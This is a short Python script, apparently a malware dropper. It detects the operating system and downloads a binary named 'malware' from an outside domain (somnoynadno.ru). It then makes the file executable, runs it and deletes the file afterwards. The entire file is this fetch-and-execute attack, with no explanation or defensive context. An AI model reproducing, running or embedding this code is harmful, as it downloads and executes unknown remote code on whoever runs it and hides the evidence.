import platform
import requests

from os import remove
from os import system

from time import sleep

PROTO = "http://"
DOMAIN = "somnoynadno.ru"
PATH = "/static/bin/malware"

s = platform.system()

if s == "Windows":
	EXT = ".exe"
else:
	EXT = ".bin"

URL = PROTO + DOMAIN + PATH + EXT
r = requests.get(URL)

if r.status_code == 200:
	FILENAME = "malware" + EXT
	with open(FILENAME, 'wb') as f:
		f.write(r.content)

	system("chmod +x " + FILENAME)
	system("./" + FILENAME)

	remove("./" + FILENAME)

	print("Done")
else:
	print("Network error")

sleep(2)